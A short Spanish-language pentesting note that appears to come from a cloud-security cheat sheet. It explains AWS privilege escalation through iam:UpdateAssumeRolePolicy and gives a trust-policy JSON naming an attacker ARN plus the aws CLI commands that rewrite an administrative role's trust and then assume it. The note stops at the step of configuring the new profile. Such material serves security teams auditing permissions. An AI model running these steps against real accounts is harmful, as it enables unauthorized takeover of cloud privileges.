# Intro

Las AssumeRolePolicy (también conocidas como relaciones de confianza) definen qué entidades están autorizadas para asumir un rol determinado.

# iam:UpdateAssumeRolePolicy

Este permiso permite a los usuarios modificar la política de confianza de un rol existente. En cuyo caso, un usuario podría alterar la política para incluirse a sí mismo u otra entidad a un rol adoptando sus permisos.

# Explotación

#### Creamos una política que soporte la acción AssumeRole sobre nuestro usuario atacante

    {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Effect": "Allow",
          "Principal": {
            "AWS": "<arn_de_user_atacante>"
          },
          "Action": "sts:AssumeRole",
          "Condition": {}
        }
      ]
    }

#### Modificamos o actualizamos la política para un rol administrativo

    aws iam update-assume-role-policy --role-name <rol> --policy-document file://assumerolepolicy.json --profile <perfil_atacante>


#### Asumimos el rol

En este caso estaremos generando una nuevas claves de acceso para un perfil de rol con el que luego nos loguearemos

    aws sts assume-role --role-arn <arn_rol> --role-session-name <nuevo_perfil> --profile <perfil_atacante>


#### Configuramos un nuevo perfil con los datos obtenidos del último comando y nos logueamos.


